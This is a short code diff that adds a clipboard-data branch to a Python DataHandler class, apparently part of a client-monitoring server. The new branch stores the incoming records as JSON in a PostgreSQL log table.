@@ -74,6 +74,8 @@ class DataHandler:
             self.handle_process_data(data)
         elif data["part"] == "window":
             self.handle_window_data(data)
+        elif data["part"] == "clipboard":
+            self.handle_clipboard_data(data)
         # Add more data part handlers as needed
 
     def handle_process_data(self, data):
@@ -86,3 +88,11 @@ class DataHandler:
     def handle_window_data(self, data):
         # Handle window data here
         pass
+
+    def handle_clipboard_data(self, data):
+        DataManager = PostgreSQLDataManager()
+        del data["client_id"]
+
+        DataManager.add_log(json.dumps(data), self.client_id)
+        DataManager.close_connection()
+        
